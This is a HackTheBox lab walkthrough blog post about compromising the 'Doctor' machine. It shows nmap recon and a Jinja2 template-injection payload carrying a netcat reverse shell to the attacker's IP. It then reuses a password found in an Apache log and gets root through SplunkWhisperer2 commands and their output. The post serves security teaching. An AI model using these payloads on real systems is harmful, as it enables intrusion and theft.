<!DOCTYPE html><html lang="en" data-theme="classic"><head><title>HackTheBox: Doctor</title><link rel="shortcut icon" href="/assets/img/favicon.ico"><link rel="alternate" type="application/rss+xml" title="All Content Feed" href="https://shellsharks.com/feeds/all-feed.xml"><link rel="alternate" type="application/rss+xml" title="Post Feed" href="https://shellsharks.com/feeds/feed.xml"><link rel="alternate" type="application/rss+xml" title="Scrolls Feed" href="https://shellsharks.com/feeds/scroll-feed.xml"><link rel="alternate" type="application/rss+xml" title="Infosec Feed" href="https://shellsharks.com/feeds/infosec-feed.xml"><link rel="alternate" type="application/rss+xml" title="Notes Feed" href="https://shellsharks.com/feeds/note-feed.xml"><link rel="alternate" type="application/rss+xml" title="Devlogs Feed" href="https://shellsharks.com/feeds/devlog-feed.xml"><link rel="alternate" type="application/rss+xml" title="Links Feed" href="https://shellsharks.com/feeds/link-feed.xml"><link rel="alternate" type="application/rss+xml" title="Captains Log Feed" href="https://shellsharks.com/feeds/log-feed.xml"><link rel="alternate" type="application/rss+xml" title="Social Web Feed" href="https://shellsharks.com/feeds/socialweb-feed.xml"><link rel="alternate" type="application/rss+xml" title="Life Feed" href="https://shellsharks.com/feeds/life-feed.xml"><link rel="blogroll" type="text/xml" href="https://shellsharks.com/assets/rsrc/shellsharks-blogroll.opml"><link type="text/plain" rel="author" href="https://shellsharks.com/humans.txt" /><link rel="canonical" href="https://shellsharks.com/htb-doctor"><link rel="apple-touch-icon" href="/assets/img/apple-touch-icon.png"><link rel="indieweb" href="/indieweb.txt" /><link href="https://github.com/shellsharks" rel="me"> <!--IndieAuth Provider--><link rel="authorization_endpoint" href="https://indieauth.com/auth"> <!--IndieAuth--><link rel="token_endpoint" href="https://tokens.indieauth.com/token"> <!--IndieAuth token endpoint--> <!--needed for button css--><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" crossorigin="anonymous"><link href='/assets/css/style.css' rel='stylesheet' type='text/css'><link href="/assets/css/syntax.css" rel="stylesheet" ><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.1/src/regular/style.css" /><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.1/src/fill/style.css" /><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.1/src/bold/style.css" /><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="Michael Sass" /><meta name="description" content="A walkthrough of pwning the HackTheBox machine "Doctor"." /><meta name="keywords" content="HackTheBox: Doctor, shellsharks, infosec, hackthebox, pentesting, appsec, network, red, python, nmap, technical" /><meta content="shellsharks" property="og:site_name" /><meta name="fediverse:creator" content="@shellsharks@shellsharks.social" /><meta name="robots" content="noai, noimageai, noml" /> <!--https://noml.info--> <script> const currentThemeX = localStorage.getItem('theme') ? localStorage.getItem('theme') : null; if (currentThemeX) { document.documentElement.setAttribute('data-theme', currentThemeX); } else if (matchMedia('(prefers-color-scheme: light)').matches) { localStorage.setItem('theme', "light"); } else if (matchMedia('(prefers-color-scheme: dark)').matches) { localStorage.setItem('theme', "classic"); } else { localStorage.setItem('theme', "classic"); } </script><meta content="HackTheBox: Doctor" property="og:title"><meta content="article" property="og:type"><meta content="A walkthrough of pwning the HackTheBox machine "Doctor"." property="og:description"><meta content="https://shellsharks.com/htb-doctor" property="og:url"><meta content="2021-02-06T09:50:00-05:00" property="article:published_time"><meta content="https://shellsharks.com/about/" property="article:author"><meta content="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/htb-doctor.png" property="og:image"><meta content="infosec" property="article:section"><meta content="infosec" property="article:tag"><meta content="hackthebox" property="article:tag"><meta content="pentesting" property="article:tag"><meta content="appsec" property="article:tag"><meta content="network" property="article:tag"><meta content="red" property="article:tag"><meta content="python" property="article:tag"><meta content="nmap" property="article:tag"><meta content="technical" property="article:tag"> <script src="/assets/js/finrand.js"></script><style> @media (max-width: 2048px) { main { width:66%; } } @media (max-width: 1800px) { main { max-width:800px; width:95%; } } @media (max-width: 768px) { main { width:95%; } }</style><body><div class="container"><heading class="container_item"><style> /* * Made by Erik Terwan * 24th of November 2015 * MIT License * * * If you are thinking of using this in * production code, beware of the browser * prefixes. */ #menuToggle { display: block; position: relative; z-index: 1; -webkit-user-select: none; user-select: none; } #menuToggle a { text-decoration: none; transition: color 0.3s ease; color: var(--contrast-font-color); } .menu_section { color: var(--light-font-color); font-weight: 900; } .menu_section:nth-of-type(n+2) { margin-top:20px; } #menuToggle a:hover { color: var(--link-hover-color); } #menuToggle input { display: block; width: 40px; height: 32px; position: absolute; /*top: -7px;*/ /*left: -5px;*/ cursor: pointer; opacity: 0; /* hide this */ z-index: 2; /* and place it over the hamburger */ -webkit-touch-callout: none; } /* * Just a quick hamburger */ #menuToggle span { display: block; width: 27px; height: 3px; margin-bottom: 4px; position: relative; margin-top:4px; background: var(--font-color); border-radius: 3px; z-index: 1; transform-origin: 4px 0px; transition: transform 0.5s cubic-bezier(0.77,0.2,0.05,1.0), background 0.5s cubic-bezier(0.77,0.2,0.05,1.0), opacity 0.55s ease; } #menuToggle span:first-child { transform-origin: 0% 0%; } #menuToggle span:nth-last-child(2) { transform-origin: 0% 100%; } /* * Transform all the slices of hamburger * into a crossmark. */ #menuToggle input:checked ~ span { opacity: 1; transform: rotate(45deg) translate(-2px, -1px); background: var(--link-hover-color); } /* * But let's hide the middle one. */ #menuToggle input:checked ~ span:nth-last-child(3) { opacity: 0; transform: rotate(0deg) scale(0.2, 0.2); } /* * Ohyeah and the last one should go the other direction */ #menuToggle input:checked ~ span:nth-last-child(2) { transform: rotate(-45deg) translate(0, -1px); } /* * Make this absolute positioned * at the top left of the screen */ #menu { position: absolute; left:-10px; width: 200px; /*fit-content;*/ padding: 10px; margin-top:10px; /*display:none;*/ background: var(--light-background-color); color:var(--font-color); list-style-type: none; -webkit-font-smoothing: antialiased; max-height: calc(80vh); overflow:auto; overscroll-behavior: contain; border-radius: 5px; /* to stop flickering of text in safari */ } /* * And let's slide it in from the left */ #menuToggle input:checked ~ ul { display:block; } .hidden { display: none; }</style><div role="navigation" id="hamburger"><div id="menuToggle"> <input type="checkbox" /> <span></span> <span></span> <span></span><ul id="menu" class="hidden"><li class="menu_section">Main<li><a href="/home/feed" ><i class="ph ph-house"></i> Home Feed</a><li><a href="/about" ><i class="ph ph-identification-card"></i> About</a><li><a href="/feeds" ><i class="ph ph-rss"></i> Feeds</a><li><a href="/activity" ><i class="ph ph-pulse"></i> Activity</a><li><a href="https://shellsharks.social/@shellsharks" target="_blank"><i class="ph ph-mastodon-logo"></i> Mastodon</a><li><a href="mailto:mike@shellsharks.com" ><i class="ph ph-envelope"></i> Email</a><li><a href="https://ko-fi.com/shellsharks" ><i class="ph ph-coffee"></i> Buy me a Coffee</a><li id="themetoggler"><i class="ph ph-swatches" id="themetoggle"></i> Toggle theme<li class="menu_section">Site Nav<li><a href="/scrolls" ><i class="ph ph-scroll"></i> Scrolls Newsletter</a><li><a href="/podcast" ><i class="ph ph-microphone"></i> The Shellsharks Podcast</a><li><a href="/notebook" ><i class="ph ph-note"></i> Notebook</a><li><a href="/blogs" ><i class="ph ph-article"></i> Blogs</a><li><a href="/blogs/infosec" ><i class="ph ph-bug"></i> Infosec Blogs</a><li><a href="/captains-log" ><i class="ph-fill ph-notebook"></i> Captain's Log</a><li><a href="/devlog" ><i class="ph ph-code-block"></i> Devlog</a><li><a href="/linklog" ><i class="ph ph-link"></i> Linklog</a><li><a href="/blogroll" ><i class="ph ph-paint-roller"></i> Blogroll</a><li><a href="/fediverse" ><i class="ph ph-fediverse-logo"></i> Fediverse ⁂</a><li><a href="/slashes" ><i class="ph ph-folder-simple-star"></i> Slashes</a><li><a href="/uses" ><i class="ph ph-hammer"></i> Uses</a><li><a href="/now" ><i class="ph ph-clock"></i> Now</a><li><a href="/tags" ><i class="ph ph-tag"></i> Tags</a><li><a href="/statboard" ><i class="ph ph-gauge"></i> Statboard</a><li><a href="/changelog" ><i class="ph ph-arrows-left-right"></i> Change Log</a><li><a href="/interests" ><i class="ph ph-heart"></i> Interests</a><li><a href="/ideas" ><i class="ph ph-lightbulb-filament"></i> Ideas</a><li><a href="/bookmarks" ><i class="ph ph-bookmarks"></i> Bookmarks</a><li><a href="/resume" ><i class="ph ph-read-cv-logo"></i> Resume</a><li><a href="/pro" ><i class="ph ph-seal"></i> Shellsharks Pro</a><li><a href="/sharkweek" ><i class="ph ph-calendar-heart"></i> >Shark Week</a><li><a href="/architecture" ><i class="ph ph-blueprint"></i> Architecture</a><li><a href="/roadmap" ><i class="ph ph-road-horizon"></i> Roadmap</a><li><a href="/tags?tag=bestof#info" ><i class="ph ph-star"></i> Best</a><li><a href="/projects" ><i class="ph ph-compass-tool"></i> Projects</a><li><a href="/now#supporting" ><i class="ph ph-hand-heart"></i> Supports</a><li><a href="/uses#referrals" ><i class="ph ph-hand-arrow-up"></i> Referrals</a><li><a href="/style" ><i class="ph ph-frame-corners"></i> Style</a><li><a href="/.well-known/security.txt" ><i class="ph ph-bug"></i> Report a Bug</a><li><a href="/humans.txt" ><i class="ph ph-user-rectangle"></i> Humans</a><li><a href="/disclaimer" ><i class="ph ph-info"></i> License & Disclaimer</a><li><a href="/privacy" ><i class="ph ph-cookie"></i> Privacy</a><li><a href="/starsharks" ><i class="ph ph-sparkle"></i> Starsharks</a><li><a href="/chipotle" ><i class="ph ph-pepper"></i> Chipotle</a><li><a href="/misc" ><i class="ph ph-paperclip"></i> Junk Drawer</a><li><a href="/ocean" ><i class="ph ph-waves"></i> the Ocean</a><li><a href="/void" ><i class="ph ph-spiral"></i> the Void</a><li class="menu_section">Other<li><a href="/public.pgp" ><i class="ph ph-key"></i> PGP Public Key</a><li><a href="https://infosec.pub/c/cybersecurity" target="_blank"><i class="ph ph-hamburger"></i> Infosec.Pub</a><li><a href="https://malici.ous.computer/@shellsharks" target="_blank"><i class="ph ph-linux-logo"></i> malici.ous.computer</a><li><a href="https://mastodon.social/@sass" target="_blank"><i class="ph-fill ph-mastodon-logo"></i> Mastodon.Social</a><li><a href="https://discord.gg/3rkHgtcYbb" target="_blank"><i class="ph ph-discord-logo"></i> Shellsharks Discord</a><li><a href="https://www.linkedin.com/in/mikesass" target="_blank"><i class="ph ph-linkedin-logo"></i> Linkedin</a><li><a href="/toots/infosec-exchange/shellsharks/" ><i class="ph ph-database"></i> Infosec.exchange Toot Archive</a><li><a href="https://github.com/shellsharks" target="_blank"><i class="ph ph-github-logo"></i> Github</a><li><a href="https://fediverse-webring-enthusiasts.glitch.me/profiles/shellsharks_infosec.exchange/index.html" target="_blank"><i class="ph ph-circle"></i> Webring Enthusiasts</a><li><a href="https://fedia.io/m/cybersecurity" target="_blank"><i class="ph ph-square-half"></i> Fedia.io</a><li><img src="/assets/img/avatar.png" height="50" style="position: relative; display: block; margin:auto; margin-top:20px; margin-bottom:20px;" /></ul></div></div><!-- window.onload = function() { var menuButton = document.getElementById('menuToggle'); var menu = document.getElementById('menu'); menu.classList.add('hidden'); document.getElementById("menuToggle").children[0].checked = false; } --> <script> const menuButton = document.getElementById('menuToggle'); const menu = document.getElementById('menu'); var links = menu.querySelectorAll('a'); menuButton.addEventListener('click', () => { if (!menu.contains(event.target)) { menu.classList.toggle('hidden'); } }); document.addEventListener('click', (event) => { if (!menu.contains(event.target) && !menuButton.contains(event.target)) { menu.classList.add('hidden'); if (document.getElementById("menuToggle").children[0].checked) { document.getElementById("menuToggle").children[0].checked = !document.getElementById("menuToggle").children[0].checked; } } }); links.forEach(function(link) { link.addEventListener('click', function(event) { document.querySelector("#hamburger").click(); }); }); </script> <img id="title_image" src="/assets/img/shellsharks.gif" alt="Shellsharks>_" onclick='window.open("/","_self")'> <span style="float:right;"><a href="/search"><i class="ph-bold ph-magnifying-glass" style="color:var(--font-color); font-size:1.6em; top:-2px;"></i></a></span> </heading><nav class="container_item"><ul id="nav_menu" style="list-style-type:none;padding-left: 10px;"><li class="menu_section">Main<li><a href="/home/feed" ><i class="ph ph-house"></i> Home Feed</a><li><a href="/about" ><i class="ph ph-identification-card"></i> About</a><li><a href="/feeds" ><i class="ph ph-rss"></i> Feeds</a><li><a href="/activity" ><i class="ph ph-pulse"></i> Activity</a><li><a href="https://shellsharks.social/@shellsharks" target="_blank"><i class="ph ph-mastodon-logo"></i> Mastodon</a><li><a href="mailto:mike@shellsharks.com" ><i class="ph ph-envelope"></i> Email</a><li><a href="https://ko-fi.com/shellsharks" ><i class="ph ph-coffee"></i> Buy me a Coffee</a><li id="themetoggler"><i class="ph ph-swatches" id="themetoggle"></i> Toggle theme<li class="menu_section">Site Nav<li><a href="/scrolls" ><i class="ph ph-scroll"></i> Scrolls Newsletter</a><li><a href="/podcast" ><i class="ph ph-microphone"></i> The Shellsharks Podcast</a><li><a href="/notebook" ><i class="ph ph-note"></i> Notebook</a><li><a href="/blogs" ><i class="ph ph-article"></i> Blogs</a><li><a href="/blogs/infosec" ><i class="ph ph-bug"></i> Infosec Blogs</a><li><a href="/captains-log" ><i class="ph-fill ph-notebook"></i> Captain's Log</a><li><a href="/devlog" ><i class="ph ph-code-block"></i> Devlog</a><li><a href="/linklog" ><i class="ph ph-link"></i> Linklog</a><li><a href="/blogroll" ><i class="ph ph-paint-roller"></i> Blogroll</a><li><a href="/fediverse" ><i class="ph ph-fediverse-logo"></i> Fediverse ⁂</a><li><a href="/slashes" ><i class="ph ph-folder-simple-star"></i> Slashes</a><li><a href="/uses" ><i class="ph ph-hammer"></i> Uses</a><li><a href="/now" ><i class="ph ph-clock"></i> Now</a><li><a href="/tags" ><i class="ph ph-tag"></i> Tags</a><li><a href="/statboard" ><i class="ph ph-gauge"></i> Statboard</a><li><a href="/changelog" ><i class="ph ph-arrows-left-right"></i> Change Log</a><li><a href="/interests" ><i class="ph ph-heart"></i> Interests</a><li><a href="/ideas" ><i class="ph ph-lightbulb-filament"></i> Ideas</a><li><a href="/bookmarks" ><i class="ph ph-bookmarks"></i> Bookmarks</a><li><a href="/resume" ><i class="ph ph-read-cv-logo"></i> Resume</a><li><a href="/pro" ><i class="ph ph-seal"></i> Shellsharks Pro</a><li><a href="/sharkweek" ><i class="ph ph-calendar-heart"></i> >Shark Week</a><li><a href="/architecture" ><i class="ph ph-blueprint"></i> Architecture</a><li><a href="/roadmap" ><i class="ph ph-road-horizon"></i> Roadmap</a><li><a href="/tags?tag=bestof#info" ><i class="ph ph-star"></i> Best</a><li><a href="/projects" ><i class="ph ph-compass-tool"></i> Projects</a><li><a href="/now#supporting" ><i class="ph ph-hand-heart"></i> Supports</a><li><a href="/uses#referrals" ><i class="ph ph-hand-arrow-up"></i> Referrals</a><li><a href="/style" ><i class="ph ph-frame-corners"></i> Style</a><li><a href="/.well-known/security.txt" ><i class="ph ph-bug"></i> Report a Bug</a><li><a href="/humans.txt" ><i class="ph ph-user-rectangle"></i> Humans</a><li><a href="/disclaimer" ><i class="ph ph-info"></i> License & Disclaimer</a><li><a href="/privacy" ><i class="ph ph-cookie"></i> Privacy</a><li><a href="/starsharks" ><i class="ph ph-sparkle"></i> Starsharks</a><li><a href="/chipotle" ><i class="ph ph-pepper"></i> Chipotle</a><li><a href="/misc" ><i class="ph ph-paperclip"></i> Junk Drawer</a><li><a href="/ocean" ><i class="ph ph-waves"></i> the Ocean</a><li><a href="/void" ><i class="ph ph-spiral"></i> the Void</a><li class="menu_section">Other<li><a href="/public.pgp" ><i class="ph ph-key"></i> PGP Public Key</a><li><a href="https://infosec.pub/c/cybersecurity" target="_blank"><i class="ph ph-hamburger"></i> Infosec.Pub</a><li><a href="https://malici.ous.computer/@shellsharks" target="_blank"><i class="ph ph-linux-logo"></i> malici.ous.computer</a><li><a href="https://mastodon.social/@sass" target="_blank"><i class="ph-fill ph-mastodon-logo"></i> Mastodon.Social</a><li><a href="https://discord.gg/3rkHgtcYbb" target="_blank"><i class="ph ph-discord-logo"></i> Shellsharks Discord</a><li><a href="https://www.linkedin.com/in/mikesass" target="_blank"><i class="ph ph-linkedin-logo"></i> Linkedin</a><li><a href="/toots/infosec-exchange/shellsharks/" ><i class="ph ph-database"></i> Infosec.exchange Toot Archive</a><li><a href="https://github.com/shellsharks" target="_blank"><i class="ph ph-github-logo"></i> Github</a><li><a href="https://fediverse-webring-enthusiasts.glitch.me/profiles/shellsharks_infosec.exchange/index.html" target="_blank"><i class="ph ph-circle"></i> Webring Enthusiasts</a><li><a href="https://fedia.io/m/cybersecurity" target="_blank"><i class="ph ph-square-half"></i> Fedia.io</a></ul></nav><main class="container_item"><div class="pageheader"></div><article class="post h-entry"><header class="post-header"><h1 class="post-title p-name" id="title" style="display:inline;">HackTheBox: Doctor</h1><span style="color:#CA3342;font-size:4em;line-height: 20px;">.</span></header><!--<div id="postinfo"> <span class="time"><i class="ph ph-note-pencil"></i> by <span class="hov p-author h-card">Mike Sass</span> <a href="/about" rel="author"><img class="u-photo" src="https://shellsharks-images.s3.amazonaws.com/surfshark.png" style="display:inline; height:1em;" /></a></span><br/> <br/> <span class="categories"> &raquo; infosec, blog </span></div>--><div class="post-content e-content" style="margin-top: 30px;"><p>This is the <strong>first</strong> in a series of <a href="https://www.hackthebox.eu">HackTheBox</a> write-ups I intend on producing. You’ll find that my walkthrough style is very “to-the-point”, with a sprinkling of commentary on my thought process as well as some of the things I tried <em>first</em> before actually figuring out the next step in the exploitation chain.<p><strong>Note</strong>: <em>These write-ups assume you have familiarity with HackTheBox, know how to get an account and understand how to connect to the individual boxes themselves over the HtB VPN.</em><hr /><h1 id="jump-to-section">Jump to Section</h1><ul><li><a href="#reconnaissance--foothold">Reconnaissance &amp; Foothold</a><li><a href="#user-flag">User</a><li><a href="#root-flag">Root</a><li><a href="#wrap-up">Outro</a></ul><h1 id="doctor">Doctor</h1><p>For this first box, I went with “<a href="https://www.hackthebox.eu/home/machines/profile/278">Doctor</a>”. This Linux system was rated “Easy” by HackTheBox and rated closer to a “Medium” difficulty by HackTheBox users.<p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/htb-doctor.png" alt="HTB-DOCTOR" /><h1 id="reconnaissance--foothold">Reconnaissance &amp; Foothold</h1><p>First, I verified connectivity to the target system with the following command. This is <a href="https://nmap.org">NMAP</a>’s <a href="https://nmap.org/book/man-host-discovery.html">Ping Scan</a> flag (<em>-sn</em>) which performs a couple different types of pings (e.g. ICMP, TCP, etc…)<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sn</span> 10.10.10.209
</code></pre></div></div><p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/ping.png" alt="NMAP PING" /><p>Once I verified connectivity, I did a quick SYN (<a href="https://nmap.org/book/synscan.html">-sS</a>) port / service discovery scan also using NMAP (sticking with just the <a href="https://nmap.org/book/nmap-services.html">default NMAP ports</a>).<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> 10.10.10.209 <span class="nt">-sV</span>
</code></pre></div></div><p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/servicescan.png" alt="NMAP Service" /><p><strong>TIP</strong>: You’ll notice I used <em>sudo</em> for this specific NMAP command. This is required when sending raw network traffic which happens by default with the command as written above.<p>With this scan, I’ve identified ports <em>22</em>, <em>80</em> and <em>8809</em>. The web server (listening on port 80) would be the natural place to start snooping around but the service (<em>Splunkd</em> httpd) listening on 8089 drew my attention first as it isn’t something I see every day.<p>The service listening on this port is a web server and hosted something clearly Splunk-related. At first glance, I noticed there is a version number (<em>8.0.5</em>) visible as well as some links that could prove interesting (named - “<em>rpc</em>”, “<em>services</em>”, “<em>servicesNS</em>” and “<em>static</em>”, respectively). Clicking on some of these gave me a password modal that after a few standard password guess attempts yielded no further entry. I poked around this web server a bit more but couldn’t find anything that helped push me forward so I decided to check out the web server on port 80 I had discovered earlier.<p>Having turned my attention to the web server on port 80 (<em>http://10.10.10.209</em>)., I began an initial high-level recon sweep… no <em>robots.txt</em>, no obvious third party web app libraries/components in use (after viewing source and clicking on all the visible links) and no obvious injection points or form fields to abuse…hmm…<p>What I did notice was the domain <strong>info@doctors.htb</strong> on the main page. Adding the line “<em>10.10.10.209 doctors.htb</em>” to my <em>/etc/hosts</em> file, I was then able to navigate to the virtual host <em>http://doctors.htb</em> where I found some new functionality. What I found was a portal titled “Doctor Secure Messaging”. After registering a user, I was then then able to create a “message” via the “New Message” link in the top right of the portal. Posting this message did nothing particularly interesting and trying a few basic injection payloads in the message form fields didn’t seem to do much either as the messages themselves we’re not reflected back to the <em>http://doctors.htb/home</em> page.<p>When viewing the source of the <em>/home</em> page I noticed an interesting nugget - the comment “<em>&lt;!-archive still under beta testing</em>“…<p>Navigating to <em>doctors.htb/archive</em> page I find merely a blank page. Viewing the source of this page, I see an XML-based RSS feed where the data from the title fields of the messages from the previous functionality have been reflected. This is shown below…<p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/rss.png" alt="RSS CHANNEL" /><p>OK, so this is definitely where the box got a little tricky for me and based on the forum posts for this particular system, where it got tricky for a lot of other HackTheBox-ers. Fortunately, some small bit of my past web-app pentesting experience would ultimately come in handy for figuring out how to exploit this particular component.<p>At first, I wasn’t exactly sure what to do so I resorted to just throwing <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2">injection payloads</a> at the title field of the messaging component until something stuck. Some time later, I saw one of my payloads, {{10*10}} evaluate on the <em>/archive</em> page to “100”. It was here, with this payload, I was reminded of an injection-class I had previously found on a penetration test - specifically, <a href="https://portswigger.net/research/server-side-template-injection">Server Side Template Injection</a> (SSTI). So, i started spamming some SSTI payloads. After some time, and plenty of googling - I came across the following blog post https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ which housed a payload that worked for me.<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\{\{request.application.__globals__.__builtins__.__import__('os').popen('hostname').read()\}\}
</code></pre></div></div><p>Throwing this payload into the messages “title” field, I get some code execution and output of the command in the <em>/archive</em> as shown below. As you can see, we can now run code on the host “Doctor”!<p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/idcommand.png" alt="HOSTNAME" /><p>After confirming I could indeed execute arbitrary commands, I wanted to get a reverse shell in order to more easily peruse the file system, escalate privileges, etc… To do so, I spun up a <a href="http://netcat.sourceforge.net">netcat</a> listener using “<em>nc -nlvp 4444</em>” on my host system and then dropped the following reverse shell into the previous injection payload.<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.29 4444&gt; /tmp/f
</code></pre></div></div><p>The final payload looked as shown below…<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\{\{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.29 4444&gt; /tmp/f').read()\}\}
</code></pre></div></div><p>Now after submitting the message with the payload above in the title and then refreshing the <em>/archive</em> page, I got the shell shoveled back to my host system!<p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/reverseshell.png" alt="CONNECT BACK WEB FOOTHOLD IMG" /><h1 id="user-flag">User Flag</h1><p>Now, with the initial foothold on “Doctor” as the “web” user, first we want to <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-1-python-pty-module">upgrade our shell to a fully interactive TTY</a> shell. We can do so by running the following…<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
</code></pre></div></div><p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/pythonpty.png" alt="Python PTY" /><p>Taking a look at <em>/etc/passwd</em> I see two potentially interesting users, “<em>shaun</em>” and “<em>splunk</em>”. From here, I tried A LOT of typical information gathering and privesc stuff, much of which comes from the classic <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmilk Linux Privesc</a> guide. After some time, I made my way to <em>/var/log</em> and found an apache backup file with a rather revealing log entry. I found this by <em>grepping</em> for “password” using the command below.<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-r</span> password <span class="nb">.</span> 2&gt;/dev/null
</code></pre></div></div><p><strong>Note</strong>: The <em>2&gt;/dev/null</em> is going to send my error output to <em>/dev/null</em> so errors won’t be printed to command output. This cleans up the output of this command.<p>The log entry of interest from this command is as you can see below…<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
Binary file ./journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal matches
</code></pre></div></div><p>In this log entry, we can see a password reset which was initiated by shaun. One “<em>su shaun</em>” with “<em>Guitar123</em>” later and I am now shaun. Digging around in the Linux host as shaun for a while turned up nothing in terms of progression to root but I was able to pull down the <em>user.txt</em> file in shaun’s home directory.<h1 id="root-flag">Root Flag</h1><p>With a set of credentials in-hand, I decided to return to the <em>Splunkd</em> httpd server I had discovered earlier. Using these creds on that main site of the <em>splunkd</em> server I find that they…work! Ok, great. Now how does that help me get root? After some tooling around with the newly exposed functionality and the “rpc” component of the server, I turned yet again to trusty Google. Quickly into that research stint I came across <a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">this blog article</a> which then led me to the handy-dandy tool <a href="https://github.com/cnotin/SplunkWhisperer2">SplunkWhisperer</a>, second of its name. From the documentation, it appeared this tool could give me code execution.<p>Of course even if I was able to execute code within the context of the user who installed <em>splunkd</em>, that wouldn’t guarantee I would have root privileges - not unless of course that service was run as root (or someone with sudo/root privs). So back to my low-priv shell on the Linux box I go to check on the origins of the <em>splunkd</em> service.<p>Lo’ and behold, <em>splunkd</em> is running, courtesy of root! (as shown below…)<p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/splunkdservice.png" alt="splunkd" /><p>Ok, so root ran <em>splunkd</em>, and <em>splunkd</em> will faithfully execute some code for me via <em>SplunkWhisperer</em>. Let’s put it all together… I clone down <em>SplunkWhisperer2</em>, <em>cd</em> to <em>PySplunkWhisperer2</em> and then try a simple payload, run remotely via <em>PySplunkWhisperer2_remote.py</em>…<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/cnotin/SplunkWhisperer2.git
<span class="nb">cd </span>PySplunkWhisperer2
python3 PySplunkWhisperer2_remote.py <span class="nt">--host</span> 10.10.10.209 <span class="nt">--lhost</span> 10.10.14.29 <span class="nt">--username</span> shaun <span class="nt">--password</span> Guitar123 <span class="nt">--payload</span> <span class="nb">id

</span>Running <span class="k">in </span>remote mode <span class="o">(</span>Remote Code Execution<span class="o">)</span>
<span class="o">[</span>.] Authenticating...
<span class="o">[</span>+] Authenticated
<span class="o">[</span>.] Creating malicious app bundle...
<span class="o">[</span>+] Created malicious app bundle <span class="k">in</span>: /tmp/tmped00srun.tar
<span class="o">[</span>+] Started HTTP server <span class="k">for </span>remote mode
<span class="o">[</span>.] Installing app from: http://10.10.14.29:8181/
10.10.10.209 - - <span class="o">[</span>15/Jan/2021 15:19:35] <span class="s2">"GET / HTTP/1.1"</span> 200 -
<span class="o">[</span>+] App installed, your code should be running now!

Press RETURN to cleanup

<span class="o">[</span>.] Removing app...
<span class="o">[</span>+] App removed
<span class="o">[</span>+] Stopped HTTP server
Bye!

</code></pre></div></div><p>Ok…. hmmm… I didn’t get much in the way of command output after running <em>SplunkWhisperer</em>. I figure everything looks right with the command syntax so I assumed the code was indeed running as root on the remote machine however this tool just simply doesn’t provide the command output in it’s own output. To test this, I whipped up a different (still very simple) command to <em>cat</em> the username for which the service would execute as to a file, write that file to the <em>/tmp</em> directory and then <em>chmod</em> the permissions so I could read it as shaun or <em>web</em> via my already established session.<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 PySplunkWhisperer2_remote.py <span class="nt">--host</span> 10.10.10.209 <span class="nt">--lhost</span> 10.10.14.29 <span class="nt">--username</span> shaun <span class="nt">--password</span> Guitar123 <span class="nt">--payload</span> <span class="s2">"whoami &gt; /tmp/whoami.txt; chmod 777 /tmp/whoami.txt"</span>
</code></pre></div></div><p>Turns out - splunkd was indeed run as root!<p><img src="https://shellsharks-images.s3.amazonaws.com/2021/htb-doctor/catwhoami.png" alt="whoami root image" /><p>Alright, now I want the root flag. So instead, I cat the <em>root.txt</em> flag from <em>/root</em> to a file in <em>/tmp</em>, <em>chmod</em> it and then read it the same way as before!<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 PySplunkWhisperer2_remote.py <span class="nt">--host</span> 10.10.10.209 <span class="nt">--lhost</span> 10.10.14.29 <span class="nt">--username</span> shaun <span class="nt">--password</span> Guitar123 <span class="nt">--payload</span> <span class="s2">"cat /root/root.txt &gt; /tmp/rootflag.txt; chmod 777 /tmp/rootflag.txt"</span>
